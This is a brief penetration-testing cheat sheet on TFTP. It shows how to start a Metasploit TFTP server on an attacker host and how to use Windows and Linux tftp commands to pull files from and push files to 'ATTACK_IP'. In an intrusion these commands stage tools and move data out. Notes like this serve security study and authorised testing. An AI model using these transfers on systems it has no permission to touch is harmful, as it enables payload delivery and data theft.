# TFTP

Port 69 UDP

### 1) Use Metasploit

    use auxiliary/server/tftp
    set srvhost ATTACK_IP
    set outputpath /home/user/scripts
    set tftproot /home/user/scripts
    exploit

### 2) Download file via TFTP 

Windows

    tftp -i ATTACK_IP GET file.txt C:\temp\file.txt

    tftp -i ATTACK_IP PUT C:\temp\file.txt file.txt

Linux

    tftp ATTACK_IP
    tftp> get file.txt /tmp/file.txt
    tftp> put file.txt /tmp/file.txt (Upload)
    tftp> quit
